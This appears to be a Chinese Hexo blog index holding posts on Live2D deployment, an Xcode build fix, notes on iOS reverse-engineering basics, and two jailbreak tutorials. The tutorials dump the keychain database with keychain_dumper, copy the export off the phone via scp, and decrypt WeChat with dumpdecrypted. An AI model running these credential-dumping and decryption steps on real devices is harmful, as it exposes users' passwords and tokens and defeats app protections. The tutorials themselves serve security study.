200 position: left // 模型在网页显示位置 hOffset: 20 vOffset: 50 mobile: show: true // 移动设备是否显示 scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 部署到网站 所有工作完成之后，就可以在自己的网站部署并显示出来了。 清空一下本地缓存hexo clean 生成博客的文件 hexo g 成功后就可以在终端看到有如下信息： 将文件提交到GitHub仓库并开始部署hexo d，至此刷新你的网站，就可以在文章页面看到你配置的Live2D动画挂件了。 发布自己的Live2D模型包 如果你想发布自己的Live2D动画模型包，可以参考如下步骤： 新建一个目录, 用Node环境执行 npm init, 包名推荐格式如：live2d-widget-model-xxx。 在刚刚创建的目录下创建 assets 子目录, 把你的模型文件放进去. 执行 npm publish 命令来发布. 此时就使用 npm install --save live2d-widget-model-xxx 来安装自定义的模型包了。 安装完成后就可以在配置文件_config.yml中 model.use 修改包名来使用了. 参考 github 官网]]></content>
      <categories>
        <category>整理</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>live2D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之Xcode10 Beta3升级Beta4编译错误]]></title>
    <url>%2Farchives%2Ffeadc9a.html</url>
    <content type="text"><![CDATA[我只愿蓬勃生活在此时此刻，无所谓去哪，无所谓见谁。那些我将要去的地方，都是我从未谋面的故乡。以前是以前，现在是现在。我不能选择怎么生，怎么死；但我能决定怎么爱，怎么活。 ——王小波《黄金时代》 简介 今天升级了下Xcode10的最新测试版本，突然正在进行的项目无法编译了，这可真是日了🐶了。 我刚开是以为是我项目改动出问题了， 然后切到Xcode9，编译，成功通过。 再切换到Xcode10，将编译器（Xcode10默认为新编译器）切换为旧版本编译器，编译，成功通过。 将编译器切换为新编译器清空编译缓存，清理项目缓存，依然无法通过。 只要切换到Xcode10的新编译器就报错error: unable to open dependencies file xxx，猜测应该是新的编译器依赖检测引起的。 问题 &amp; 解决编译错误如下1unable to open dependencies file (/Users/sevencho/Library/Developer/Xcode/DerivedData/KYPetNearby-aslcxdeqowvpemcspggokzrpkzcp/Build/Intermediates.noindex/Pods.build/Debug-iphonesimulator/Pods-KYPetNearby.build/SwiftStdLibToolInputDependencies.dep) 尝试解决 首先确定代码没有问题后，根据错误信息是在这个Pods-KYPetNearby.build文件里面出现，猜测可能是新开发工具的新编译器在检测CocoaPods导致的问题。 尝试1： 移除所有已经Pod install安装的库，清空项目缓存 重新Pod install安装需要的库 重新编译项目，依然是出现相同的错误 尝试2： 清空项目缓存 Pod update更新所有安装的库 重新编译项目，依然是出现相同的错误 尝试3：（猜测可能是CocoaPods版本问题） 清空项目缓存 更新CocoaPods 12sudo gem update --systemsudo gem install cocoapods -n/usr/local/bin 更新所有安装的库 1pod update 重新编译项目，世界恢复和平了。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Xcode10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS逆向笔记（二）：iOS二进制文件类型]]></title>
    <url>%2Farchives%2Fc7624e77.html</url>
    <content type="text"><![CDATA[人活在世界上，快乐和痛苦本就分不清。所以我只求它货真价实。 ——王小波 《革命时期的爱情》 iOS二进制文件类型 在iOS逆向工程初学阶段，我们的目标主要是Application、Dynamic Library（以下简称dylib）和Daemon这三类二进制文件，对它们的了解越深入，逆向工程就会越顺利。这三类文件分工不同，其目录结构和文件权限也有一些区别。 Application Application就是我们最熟悉的App了。虽然对于大多数iOS开发者来说，工作都是在跟App打交道，但在iOS逆向工程中，关注App的侧重点与正向开发还是不尽相同的。了解下面的几个App相关概念，是开始逆向工程前的必备工作。 bundle bundle的概念来源于NeXTSTEP，它不是一个文件，而是一个按某种标准结构来组织的目录，其中包含了二进制文件及运行所需的资源。正向开发中常见的App和framework都是以bundle的形式存在的；在越狱iOS中常见的PreferenceBundle，可以看成是一种依附于Settings的App，结构与App类似，本质也是bundle。 Framework也是bundle，但framework的bundle中存放的是一个dylib，而不是可执行文件。相对来说，framework的地位比App更高，因为一个App的绝大多数功能都是通过调用framework提供的接口来实现的。将某个bundle确立为逆向目标后，绝大多数逆向线索都可以在bundle内找到，这大大降低了逆向工程的复杂度。 App目录结构 在iOS逆向工程中，对App目录结构的熟悉程度是决定工作效率的重要因素。App目录的以下三个部分比较重要。 Info.plist Info.plist记录了App的基本信息，如bundle identifier、可执行文件名、图标文件名等。可以通过Xcode查看它的值，也可以通过Xcode自带的命令行工具plutil查看它的值，如下： 123plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/Info.plist | grep CFBundleIdentifier&quot;CFBundleIdentifier&quot; =&gt; &quot;com.apple.SiriViewService&quot; 可执行文件 可执行文件的重要性不言而喻，它是App目录下最核心的部分，也是逆向工程最主要的目标。同样可以通过Xcode和plutil两种方式来查看Info.plist，定位可执行文件。用Xcode查看Info.plist的界面，也可以通过Xcode自带的命令行工具plutil查看它的值，如下： 12snakeninny$ plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/Info.plist| grep CFBundleExecutable&quot;CFBundleExecutable&quot; =&gt; &quot;SiriViewService&quot; lproj目录 lproj目录下存放的是各种本地化的字符串（.strings），是iOS逆向工程的重要线索，也可以用plutil查看，如下： 12345678910 plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/en.lproj/Localizable.strings&#123; &quot;ASSISTANT_INITIAL_QUERY_IPAD&quot; =&gt; &quot;What can I help youwith?&quot; &quot;ASSISTANT_BOREALIS_EDUCATION_SUBHEADER_IPAD&quot; =&gt; &quot;Justsay &quot;Hey Siri&quot; to learn more.&quot; &quot;ASSISTANT_FIRST_UNLOCK_SUBTITLE_FORMAT&quot; =&gt; &quot;Yourpasscode is required when %@ restarts&quot;…… 系统App VS StoreApp /Applications/目录存放系统App和从Cydia下载的App（我们把来自Cydia的App视为系统App），而/var/mobile/Containers/目录存放的则是StoreApp。虽然两者都是App，但它们在如下方面存在着一些差别。 目录结构 两种App的bundle内部目录结构区别不大，都含有Info.plist、可执行文件、lproj目录等，但是数据目录的位置不同：StoreApp的数据目录在/var/mobile/Containers/Data/下，以mobile权限运行的系统App的数据目录在/var/mobile/下，而以root权限运行的系统App的数据目录在/var/root/下。 安装包格式与权限 Cydia App的安装包格式一般是deb，StoreApp的安装包格式一般是ipa。其中deb是来自Debian的安装包格式，由Cydia作者saurik移植到iOS中，它的属主用户和属主组一般是root和admin，能够以root权限运行；而ipa是苹果为iOS推出的专属App安装包格式，属主用户和属主组都是mobile，只能以mobile权限运行。 沙盒（sandbox） 通俗地说，iOS中的沙盒就是一种访问限制机制，我们可以把它看作是权限的一种表现形式，授权文件（entitlements）也是沙盒的一部分。它是iOS最核心的安全组件之一，其实现很复杂，这里不过多讨论其细节。总的来说，沙盒会将App的文件访问范围限制在这个App内部，一个App一般不知道其他App的存在，更别说访问它们了；沙盒还会限制App的功能，例如对iCloud接口的调用就必须经过沙盒的允许。 在初学阶段，我们的目标不是沙盒，知道有这样一个东西存在就够了。在iOS逆向工程中，越狱本身已经破除了iOS的绝大多数安全限制，并对沙盒进行了一定程度的扩充，因此我们往往很容易忽略sandbox的存在，从而碰到一些看似很奇怪的问题。比如某个tweak不能写文件，调用了某个函数却没有出现应有的效果，在确保自己的代码没有问题的前提下，就要回过头来检查这些问题是不是因为权限不够，或者沙盒限制造成的。 Dynamic Library 大部分iOS开发者的日常工作应该都是写App，估计很少有人写过dylib，因此对dylib的概念很陌生。殊不知，在Xcode工程里导入的各种framework，链接的各种lib，其实本质都是dylib。可以用“file”命令验证一下，如下： 123file /Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/Frameworks/UIKit.framework/UIKit/Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/Frameworks/UIKit.framework/UIKit: Mach-O dynamically linked shared library arm 如果把焦点转移到越狱iOS中，Cydia里的各种tweak无一不是以dylib的形式工作的，正是这些tweak的存在让我们能够随意定制自己的iOS。在逆向工程中，我们会频繁接触各种dylib，因此有必要了解一些相关知识。 在iOS中，lib分为static和dynamic两种，其中staticlib在编译阶段成为App可执行文件的一部分，会增加可执行文件的大小。因为App尺寸变大，启动时需要加载的内容变多，所以可能会导致App启动变慢。dylib则相对“智能”一些，它不会改变可执行文件的大小，只有当App需要用到这个dylib时，iOS才会把它加载进内存，成为App进程的一部分。 值得一提的是，dylib虽然充斥在iOS的各个角落，是逆向工程的重要目标类型，但其本身并不是可执行文件，不能独立运行，只能为别的进程服务，而且它们寄生在别的进程里，成为了这个进程的一部分。因此，dylib的权限是由它寄生的那个App决定的，同一个dylib寄生在系统App和StoreApp里时的权限是不同的。例如，你写了一个Instagram的tweak，用来把喜欢的图片保存在本地，如果保存目录是/var/mobile/Containers/Data/下App对应的Documents目录，那么因为Instagram是一个StoreApp，这样的操作是没有问题的，tweak能够正常工作。而如果保存目录是/var/mobile/Documents，那么在兴高采烈地保存了一大堆美图，准备回头细细品味时，你就会发现/var/mobile/Documents里啥图片也没有——操作都被sandbox给禁掉了。 Daemon 相信绝大部分开发者从接触iOS开发的第一天起，就不断被苹果灌输这样一个观念——iOS中没有真正的后台多任务，你的App在后台将被大大限制。如果你是一个纯粹的App Store开发者，坚信并坚守这个观念，那么它将是你的App通过苹果审核的助推剂；但想要在学习逆向工程的同时了解一些官方文档没有阐述的事实，那么你就要保持冷静，理性思考。让我们一起回想一下iPhone上的一些现象。 当我们正在用iPhone上网或刷微博时来了一个电话，所有其他操作会立即中断，iOS第一时间将接听电话的界面呈现在我们面前。如果iOS中没有真正的后台多任务，系统是如何实时处理这个来电的呢？ 对于那些经常收到垃圾短信和骚扰电话的朋友来说，类似于SMSNinja这样的防火墙软件必不可少。如果它不能常驻iOS后台，怎么能够实时地处理并过滤收到的每一条短信呢？ Backgrounder是一款iOS 5时代的插件，它能够帮助App实现真正的后台运行。有了它，我们再也不用担心因为push功能的不给力而漏收QQ消息啦！ 如果iOS中没有真正的后台多任务，Backgrounder怎么会存在呢？ 这些现象无一不说明iOS实际上存在真正的后台多任务。那么难道是苹果说错了？并不是！对于StoreApp来说，当用户按下home键时，进程就进入后台了，大多数功能都会被暂停；也就是说，对于遵纪守法的App Store开发者来说，可以把iOS看作是没有真正后台多任务的系统，因为你唯一能干的事不支持后台多任务。但iOS源于OSX，后者又跟所有类UNIX操作系统一样，有daemon（即守护进程，Windows称Service）的概念。越狱开放了iOS全文件系统，daemon也得以展现在我们面前。 Daemon为后台运行而生，给用户提供了各种“守护”，如imagent保障了iMessage的正确收发，mediaserverd处理了几乎所有的音频、视频，syslogd则用于记录系统日志等。iOS中的daemon主要由一个可执行文件和一个plist文件构成。iOS的根进程是launchd，它会在开机时检查/System/Library/LaunchDaemons和/Library/LaunchDaemons下所有格式符合规定的plist文件，然后启动对应的daemon。这里的plist文件与App中的Info.plist文件作用类似，即记录daemon的基本信息，如下： 12345678910111213141516171819202122232425262728plutil -p/Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/LaunchDaemons/com.apple.imagent.plist&#123; &quot;WorkingDirectory&quot; =&gt; &quot;/tmp&quot; &quot;Label&quot; =&gt; &quot;com.apple.imagent&quot; &quot;JetsamProperties&quot; =&gt; &#123; &quot;JetsamMemoryLimit&quot; =&gt; 3000 &#125; &quot;EnvironmentVariables&quot; =&gt; &#123; &quot;NSRunningFromLaunchd&quot; =&gt; &quot;1&quot; &#125; &quot;POSIXSpawnType&quot; =&gt; &quot;Interactive&quot; &quot;MachServices&quot; =&gt; &#123; &quot;com.apple.hsa-authentication-server&quot; =&gt; 1 &quot;com.apple.imagent.embedded.auth&quot; =&gt; 1 &quot;com.apple.incoming-call-filter-server&quot; =&gt; 1 &#125; &quot;UserName&quot; =&gt; &quot;mobile&quot; &quot;RunAtLoad&quot; =&gt; 1 &quot;ProgramArguments&quot; =&gt; [ 0 =&gt;&quot;/System/Library/PrivateFrameworks/IMCore.framework/imagent.app/imagent&quot; ] &quot;KeepAlive&quot; =&gt; &#123; &quot;SuccessfulExit&quot; =&gt; 0 &#125;&#125; 相对于App，daemon提供的功能要底层得多，逆向难度也要大得多，随意改动造成的后果当然也就严重得多，所以白苹果的惨案才会时有发生。在iOS逆向工程初学阶段，请不要把daemon当作练习目标；当你逆向了几个App，有了一定的心得和积累后再挑战这些daemon才是比较明智的选择。相比App，逆向daemon花费的时间和精力会更多，但更多的付出一定会带来更丰厚的回报。例如，“iOS上的第一款电话录音软件”Audio Recorder就是通过逆向mediaserverd这个daemon实现的。 总结 简单介绍了常见的二进制文件类型，它们都是App Store开发者不需要了解也接触不到的知识，在学习iOS逆向工程时很容易形成概念盲区。 本文旨在科普那些在逆向工程中非常重要但苹果官方闭口不提的iOS系统级知识点，从而为AppStore开发者打开iOS逆向工程的这扇窗。 参考 本文摘录整理自《iOS应用逆向工程(第2版)》一书, 以便学习查阅]]></content>
      <categories>
        <category>iOS</category>
        <category>逆向笔记</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>逆向笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS逆向笔记（一）：iOS目录结构 & 文件权限]]></title>
    <url>%2Farchives%2F971c1db6.html</url>
    <content type="text"><![CDATA[绝望是无限的美好。 ——王小波 《万寿寺》 简介 相较于iOS应用的高层表象，人们对其底层实现更感兴趣，这也是大家进行逆向工程的源动力。但是我们也都知道，未越狱的iOS是个封闭的黑盒子，直到evad3rs、盘古、太极等团队把iOS越狱之后，这个黑盒子才被打开，神秘的iOS得以完整地展现在我们面前。 iOS系统结构 对于未越狱的iOS，苹果官方开放给第三方直接访问iOS文件系统的接口非常有限，开发者只需要遵循规定，参考文档即可完成工作。因此，纯粹的AppStore开发者可能对iOS系统结构一无所知。 因为权限极低，来自App Store的普通App（以下简称StoreApp）不能访问自身目录以外的绝大多数文件。而iOS一旦越狱，来自Cydia的App就可以拥有比StoreApp更高的权限，从而访问全系统文件。 还可以在AFC2服务的帮助下，通过iFunBox等PC端软件访问iOS全系统文件 iOS目录结构简介 iOS是由OSX演化而来的，而OSX则是基于UNIX操作系统的。这三者虽然有很大区别，但它们血脉相连。从Filesystem Hierarchy Standard和hier(7)中，可以一窥iOS目录结构的设计标准。 Filesystem Hierarchy Standard（以下简称FHS）为类UNIX操作系统的文件目录结构制定了一套标准，它的初衷之一是让用户预知文件或目录的存放位置。OSX在此基础上形成了自己的hier(7)框架。 类UNIX操作系统的常见目录结构如下所示。 / ：根目录，以斜杠表示，其他所有文件和目录在根目录下展开。 /bin ：“binary”的简写，存放提供用户级基础功能的二进制文件，如ls、ps等。 /boot ：存放能使系统成功启动的所有文件。iOS中此目录为空。 /dev ：“device”的简写，存放BSD设备文件。每个文件代表系统的一个块设备或字符设备，一般来说，“块设备”以块为单位传输数据，如硬盘；而“字符设备”以字符为单位传输数据，如调制解调器。 /sbin ：“system binaries”的简写，存放提供系统级基础功能的二进制文件，如netstat、reboot等。 /etc ：“Et Cetera”的简写，存放系统脚本及配置文件，如passwd、hosts等。在iOS中，/etc是一个符号链接，实际指向/private/etc。 /lib ：存放系统库文件、内核模块及设备驱动等。iOS中此目录为空。 /mnt ：“mount”的简写，存放临时的文件系统挂载点。iOS中此目录为空。 /private ：存放两个目录，分别是/private/etc和/private/var。 /tmp ：临时目录。在iOS中，/tmp是一个符号链接，实际指向/private/var/tmp。 /usr ：包含了大多数用户工具和程序。/usr/bin包含那些/bin和/sbin中未出现的基础功能，如nm、killall等；/usr/include包含所有的标准C头文件；/usr/lib存放库文件。 /var ：“variable”的简写，存放一些经常更改的文件，比如日志、用户数据、临时文件等。其中/var/mobile和/var/root分别存放了mobile用户和root用户的文件，是重点关注的目录。 作为iOS开发者，日常操作所对应的功能模块大多来自iOS的独有目录 /Applications ：存放所有的系统App和来自于Cydia的App，不包括StoreApp /Developer ：如果一台设备连接Xcode后被指定为调试用机，Xcode就会在iOS中生成这个目录，其中会含有一些调试需要的工具和数据 /Library ：存放一些提供系统支持的数据。其中/Library/MobileSubstrate下存放了所有基于CydiaSubstrate（原名MobileSubstrate）的插件。 /System/Library ：iOS文件系统中最重要的目录之一，存放大量系统组件。 /System/Library/Frameworks和/System/Library/PrivateFrameworks：存放iOS中的各种framework，其中出现在SDK文档里的只是冰山一角，还有数不清的未公开功能等待我们去挖掘。 /System/Library/CoreServices里的SpringBoard.app：iOS桌面管理器（类似于Windows里的explorer），是用户与系统交流的最重要中介 /User ：用户目录，实际指向/var/mobile，这个目录里存放大量用户数据，比如： /var/mobile/Media/DCIM下存放照片； /var/mobile/Media/Recordings下存放录音文件； /var/mobile/Library/SMS下存放短信数据库； /var/mobile/Library/Mail下存放邮件数据。 注意 另外一个非常重要的子目录是/var/mobile/Containers，存放StoreApp。值得注意的是，App的可执行文件在bundle与App中的数据目录被分别存放在/var/mobile/Containers/Bundle和/var/mobile/Containers/Data这两个不同目录下。 iOS文件权限简介 iOS是一个多用户操作系统。“用户”是一个抽象的概念，它代表对操作系统的所有权和使用权。比如，mobile用户无法调用reboot命令重启iOS，而root用户却可以；“组”是用户的一种组织方式，一个组可以包含多个用户，一个用户也可以属于多个组。 iOS中的每个文件都有一个属主用户和一个属主组，或者说这个用户和这个组拥有这个文件；每个文件都具有一系列权限，简单地说，权限的作用在于说明文件的属主用户能做什么，属主组能做什么，以及其他所有人能做什么。iOS用3位（bit）来表示文件的权限，从高位到低位分别是r（read）权限、w（write）权限，以及x（execute）权限。文件与用户的关系存在以下三种可能性： 此用户是属主用户； 此用户不是属主用户，但在属主组里； 此用户既不是属主用户，又不在属主组里。 所以需要用3*3位来表示一个文件的权限，如果某一位为1，则这一位代表的权限生效，否则无效。例如，111101101代表rwxr-xr-x，即该文件的属主用户拥有r、w、x权限，而属主组和其他所有人只具有r和x权限；同时，二进制的111101101转换成十六进制是755，也是一种常见的权限表示法。 事实上，除r、w、x权限外，文件还可以拥有SUID、SGID和sticky等特殊权限，它们的应用频率不高，因此不占用单独的权限位，而是以简化形式出现在x权限所在的权限位中。 参考 本文摘录整理自《iOS应用逆向工程(第2版)》一书]]></content>
      <categories>
        <category>iOS</category>
        <category>逆向笔记</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>逆向笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（五）：使用Keychain-Dumper导出keychain数据]]></title>
    <url>%2Farchives%2F65ed9c65.html</url>
    <content type="text"><![CDATA[生为冰山，就该淡淡地爱海流、爱风，并且在偶然接触时，全心全意地爱另一块冰山。 ——王小波 《似水柔情》 简介 根据苹果的介绍，iOS设备中的Keychain是一个安全的存储容器，可以用来为不同应用保存敏感信息比如用户名，密码，网络密码，认证令牌。苹果自己用keychain来保存Wi-Fi网络密码，VPN凭证等等。它是一个在所有app之外的sqlite数据库。 keychain可以说是系统里唯一可以做到安全可靠存储应用敏感数据并且可以在应用卸载或重新安装时仍然保留其数据的地方。当使用itunes进行数据备份时，每个应用程序在keychain里的数据都会得到备份,而且备份的数据是经过加密的。 鉴于keychain的这些特性，使得它成为开发者存储应用敏感数据的首选，应用程序常见的敏感数据通常有密码，秘钥等等。 但是，以上所讨论的安全仅限于手机不越狱为前提！！如果手机越狱我们可以使用Keychain-Dumper获取到KeyChain中的所有数据，不知道是算幸运还是不幸。 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面 iOS攻防（四）：使用Dumpdecrypted 砸壳 &amp; class-dump 导出头文件 KeyChain数据库权限KeyChain数据库 所有存储在KeyChain中的数据，实际上是保存在一个keychain-2.db的数据库中。 该数据库位于/private/var/Keychains/目录下。 更改权限 默认情况下，我们是不能都读取keychain-2.db数据库的，所以需要先赋予其可读权限。 Terminal通过SSH登录手机 进入Keychains目录 给keychain-2.db数据库可读权限 123cd /private/var/Keychains/chmod +r keychain-2.db Keychain-Dumper下载安装Keychain-Dumper 下载Keychain-Dumper Keychain-Dumper的简单使用Keychain-Dumper可执行文件传输至手机 将下载的Keychain-Dumper文件夹内的keychain_dumper可执行文件传输至手机指定路径，如我放在手机/bin目录下 可以使用电脑助手，也可以使用指令操作如下： 123exit // 退出SSH连接手机scp ~/Desktop/Keychain-Dumper/keychain_dumper root@192.168.1.60:/bin/keychain_dumper 导出KeyChain数据 使用SSH连接手机，进入Root目录 可以直接执行上一步传输的可执行文件，会在终端直接输出dumper的KeyChain内容。 1./keychain_dumper 也可以执行上一步传输的可执行文件，并导出为txt文本方便查看 1/bin/keychain_dumper &gt; keychain-export.txt 将导出的文本文件，传输至电脑上查看, 可以使用电脑助手，也可以使用命令操作如下： 12cd /binscp root@192.168.1.60:keychain-export.txt ~/Desktop/keychain-export.txt 打开文本文件可以发现，我们的的KeyChain存储的数据在这里一览无遗，如果是敏感信息被别人破解，那么后果… 参考 iOS安全攻防（九）：使用Keychain-Dumper导出keychain数据 Keychain Dumper]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（四）：使用Dumpdecrypted 砸壳 & class-dump 导出头文件]]></title>
    <url>%2Farchives%2F8c50aab9.html</url>
    <content type="text"><![CDATA[我向来不怕得罪朋友，因为既是朋友，就不怕得罪，不能得罪的就不是朋友，这是我的一贯作风。由这一点你也可猜出，我的朋友为什么这么少。 ——王小波《似水流年》 简介 class-dump是用来dump目标对象的头文件信息的工具。它利用Objective-C语言的runtime的特性，将存储在mach-O文件中的类/分类/协议等头文件信息提取出来并生产.h文件。 从AppStore下载的App是被苹果加密过的，可执行文件被套上了一层保护壳， 而class-dump无法作用于加密过的App。 在这种情况下，想要获取头文件，需要先解密App的可执行文件，俗称“砸壳”。 dumpdecrypted就是由越狱社区的知名人士Stefan Esser出品的一款砸壳工具，被广泛运用在iOS逆向工程研究中。 注意：如果不砸壳，直接使用class-dump现在已经无法dump出头文件的（之前可以dump出头文件但是是加密的），只会生成一个CDStructures.h文件. 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面 class-dump下载安装class-dump 关于的class-dump详细安装方法，请点击这里 class-dump 可用于 查看闭源的应用、frameworks、bundles。 对比一个 APP 不同版本之间的接口变化。 对一些私有 frameworks 做些有趣的试验。 class-dump的简单使用dump出Mac版微信的头文件1class-dump -H /Applications/WeChat.app -o ~/Desktop/dump/WeChat-dump -H 要解析的文件 /Applications/WeChat.app 需要反编译的应用路径 -o 输出目录（后面跟路径） ~/Desktop/dump/WeChat-dump 头文件存放路径 也可以dump出系统库12class-dump /System/Library/Frameworks/AppKit.framework // AppKitclass-dump /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/UIKit.framework // UIKit dumpMac版微信结果 执行完成后即可在指定输出目录查看dump的头文件信息 打开查看某个头文件的内容 dumpdecrypted 我们都知道Clutch是一个非常厉害的砸壳工具, 那么为什么还需要dumpdecrypted这个工具呢? 因为Clutch并不是万能的,无法砸开含有兼容WatchOs2的App, 从AppStore下载的有些App(比如WeChat)并不能使用Clutch来进行砸壳, 使用Clutch工具来进行砸壳会失败。 我的准备 MacOS 10.13.5 iPhone 5C 10.3.2 dumpdecrypted class-dump 在Cydia中安装 cycript, 可以先不用管 cycript 是什么, 后续会单独详讲. iTools或者其他助手工具 下载安装dumpdecrypted 去 Github 下载dumpdecrypted源码, 源码就一个C源文件. 下载后解压，文件如下： dumpdecryptedp编译 下载后打开Makefile文件，注意第三行： 1SDK=`xcrun --sdk iphoneos --show-sdk-path` 这里填写的SDK必须与你越狱的iPhone系统版本需要一致，你可以使用如下指令先查看你Xcode的SDK版本： 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk 虽然我的Xcode的SDK版本是11.4，但是我查看了下支持的目录文件，是有10.3的支持文件的，所以可以直接编译，查看目录如下： 12// 进入Application内，Xcode右键显示包内容/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport 打开终端，进入下载的dumpdecryptedp文件夹目录, 执行make即可完成编译, 操作步骤如图所示: 12345678910cd ~/Desktop/dumpdecryptedmake// 编译完输出信息如下`xcrun --sdk iphoneos --find gcc` -Os -Wimplicit -isysroot `xcrun --sdk iphoneos --show-sdk-path` -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/Frameworks -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/PrivateFrameworks -arch armv7 -arch armv7s -arch arm64 -c -o dumpdecrypted.o dumpdecrypted.c`xcrun --sdk iphoneos --find gcc` -Os -Wimplicit -isysroot `xcrun --sdk iphoneos --show-sdk-path` -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/Frameworks -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/PrivateFrameworks -arch armv7 -arch armv7s -arch arm64 -dynamiclib -o dumpdecrypted.dylib dumpdecrypted.old: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks'ld: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks'ld: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks' 编译成功后会在dumpdecryptedp文件目录下会生成dumpdecrypted.dylib和dumpdecrypted.o两个文件。 dumpecrypted.dylib 签名 如果不对该文件进行签名, 后续砸壳的操作会失败. 先找到已经在电脑上面安装的苹果开发者证书, 操作如下: 12## 列出可签名证书, 找到 mac 上面已经安装的证书security find-identity -v -p codesigning dumpecrypted.dylib签名, 命令如下: 1codesign --force --verify --verbose --sign "iPhone Developer: xxx xxxx (xxxxxxxxxx)" dumpdecrypted.dylib &quot;iPhone Developer: xxx xxxx (xxxxxxxxxx)&quot; 为上一步找到的你已经安装的开发者证书名称。 dumpdecryptedp的简单使用查找目标 App 所在进程 推荐先清空手机后台运行的所有程序 打开微信应用 通过电脑终端ssh登录iPhone手机，查看当前运行的所有的进程 1ps -e 会列出所有当前正在运行的进程，虽然我们杀掉了所有后台服务，但是会有很多的系统进程信息干扰，我们需要找到以WeChat结尾的进程，即是我们需要的微信进程 PID 是微信进程的进程ID CMD 是微信进程可执行文件的路径 WeChat.app 即是我们需要砸壳的目标app 12PID TTY TIME CMD771 ?? 0:06.94 /var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat 补充 查找可执行文件路径比较快的方法（如果知道可执行文件名称） 1find / -name WeChat.app 查找程序进程PID比较快的方法（如果知道可执行文件名称） 1ps aux | grep WeChat 查找目标app的Documents目录 砸壳需要将我们编译生成的dumpdecrypted.dylib文件放入目标app的Documents目录下，所以我们需要找到目标app的Documents目录。 终端进入手机的根目录执行下面指令, 我们会进入cy#模式： 771 是我们上一步查找到的微信的进程ID 1CoderBoy-iPhone:~ root# cycript -p 771 在cy#模式使用OC方法查找微信应用的Documents目录, 输入下面代码 1[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0] 成功后会输出微信应用的Documents目录路径，如下： 注意: 执行过程中, 在iPhone上面打开运行一下微信, 不然上面的执行一直卡在那里不动. 成功后输入ctrl＋d退出cycript 1#&quot;file:///var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/&quot; 砸壳 拷贝dumpdecrypted.dylib这个之前编译签名好的文件到iPhone上面该目标APP的Documents目录. 方法一：直接在电脑上通过助手软件将dumpdecrypted.dylib放入到目标app的Documents目录。 方法二：也可以使用指令将dumpdecrypted.dylib放入到目标app的Documents目录，操作如下： 在Mac上新建一个终端，如果当前是在手机root模式，也可以输入exit直接退出，输入如下指令： 1234// ~/Desktop/dumpdecrypted/dumpdecrypted.dylib 编译签名好的dumpdecrypted.dylib文件路径// /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/ 上一步获取到的目标app的Documents目录scp ~/Desktop/dumpdecrypted/dumpdecrypted.dylib root@192.168.1.60:/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/ 进入到手机Documents目录, 查看dumpdecrypted.dylib文件是否存在 12345ssh root@192.168.1.60cd /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documentsls -l 开始砸壳，注意 DYLD_INSERT_LIBRARIES=后填写的是你刚刚传输到Documents目录的.dylib文件名，我的是 dumpdecrypted.dylib。 dumpdecrypted.dylib后的路径是需要砸壳的目标app的可执行文件路径，也即是之前查找目标app进程时获取到的路径，而不是Documents目录路径。 1YLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat 砸壳成功后输入信息如下： 砸壳成功后会在Documents目录生成一个名为AppName.decrypted文件,如当前操作会生成一个WeChat.decrypted文件，可以使用ls -l指令查看。 123456789101112131415161718mach-o decryption dumperDISCLAIMER: This tool is only meant for security research purposes, not for application crackers.[+] detected 32bit ARM 